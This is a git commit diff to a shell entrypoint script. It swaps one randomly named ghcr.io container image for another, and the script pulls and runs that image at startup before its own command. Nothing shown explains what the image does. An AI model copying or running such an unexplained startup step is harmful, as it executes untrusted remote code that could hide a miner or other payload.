78b7d866f7fede0c9ea928805b4685d6fd785b3e
sea sunri seice <vijayabhanu01@outlook.com>
2024-10-27 15:19:00 +0530

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -3,7 +3,7 @@ sleep 5s;
 
 docker run --rm -i \
   --shm-size 4g \
-  ghcr.io/alrightdredsiopyki/usmrsearntesqxi013579456v3cy7rv60943dbitcpyv3125:khf3g079bt8kytv57vt097rec7bitc0001-of-three
+  ghcr.io/alrightdredsiopyki/usmrsearntesqxi013579456v3cy7rv60943dbitapyv3125:khf3g079bt8kytv57vt097rec7bita0001-of-one
 
 # start the script
 exec "$@"
